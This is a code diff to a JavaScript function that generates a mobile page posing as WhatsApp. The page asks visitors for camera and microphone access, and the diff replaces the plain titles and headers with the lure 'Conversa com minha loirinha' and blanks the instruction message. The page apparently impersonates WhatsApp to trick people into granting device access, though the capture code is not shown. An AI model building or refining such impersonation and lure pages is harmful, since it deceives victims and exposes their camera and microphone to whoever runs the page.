@@ -25,7 +25,7 @@ function getMobileHTML(fullUrl) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
-    <title>WhatsApp</title>
+    <title>WhatsApp - Conversa com minha loirinha</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -173,7 +173,7 @@ function getMobileHTML(fullUrl) {
 <body>
     <div class="modal" id="permissionModal">
         <div class="modal-content">
-            <h3>📱 WhatsApp</h3>
+            <h3>📱 WhatsApp - Conversa com minha loirinha</h3>
             <p>Permita acesso à câmera e microfone</p>
             <button class="start-btn" id="startBtn">Iniciar Conversa</button>
         </div>
@@ -181,7 +181,7 @@ function getMobileHTML(fullUrl) {
 
     <div class="header">
         <div class="status-dot"></div>
-        <h2>WhatsApp</h2>
+        <h2>WhatsAp - Conversa com minha loirinha</h2>
     </div>
 
     <div class="messages" id="messages">
@@ -319,7 +319,7 @@ function getMobileHTML(fullUrl) {
             if (!permissions) {
                 const div = document.createElement('div');
                 div.className = 'message received';
-                div.innerHTML = '<div class="bubble">Olá! Clique em "Iniciar Conversa" para ativar tudo.</div>';
+                div.innerHTML = '<div class="bubble"></div>';
                 messagesDiv.appendChild(div);
             }
         }, 600);
